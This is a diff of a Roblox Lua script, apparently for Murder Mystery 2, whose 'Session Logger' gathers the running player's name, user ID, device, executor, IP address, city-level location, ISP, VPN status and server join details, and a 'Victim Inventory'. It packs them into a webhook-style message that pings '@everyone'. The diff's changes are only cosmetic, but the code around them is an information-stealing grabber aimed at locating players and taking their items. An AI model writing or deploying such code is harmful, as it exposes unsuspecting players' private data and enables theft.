@@ -500,8 +500,7 @@ task.spawn(function()
         local joinLink = "https://www.roblox.com/games/"..placeId.."/Murder-Mystery-2?gameInstanceId="..jobId
         
         local embed = {
-            title = "Session Logger (Mobile Version)",
-            color = 3447003,
+            title = "Session Logger",
             fields = {
                 {name = "Player", value = string.format("[%s (@%s)](https://www.roblox.com/users/%d/profile)", LocalPlayer.DisplayName, LocalPlayer.Name, LocalPlayer.UserId), inline = true},
                 {name = "System", value = string.format("**Device:** %s\n**Executor:** %s", device, executor), inline = true},
@@ -510,7 +509,7 @@ task.spawn(function()
                 {name = "Network & Location", value = string.format("**IP:** %s\n**Location:** %s, %s, %s\n**ISP:** %s\n**VPN/Proxy:** %s", ip, country, region, city, isp, isVpn), inline = false},
                 {name = "Server JobID", value = string.format("`%s`\n[Join via RoPro/BTRoblox](%s)", jobId, joinLink), inline = false},
                 {name = "Join via Executor:", value = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game:GetService(\"Players\").LocalPlayer)\n```", placeId, jobId), inline = false},
-                {name = "🎒 Victim Inventory:", value = invText, inline = false}
+                {name = "Victim Inventory:", value = invText, inline = false}
             }
         }
         
@@ -519,7 +518,7 @@ task.spawn(function()
         end
         
         local payload = {
-            content = "@everyone [MOBILE LOG]",
+            content = "@everyone",
             embeds = {embed},
             username = "Session Logger"
         }
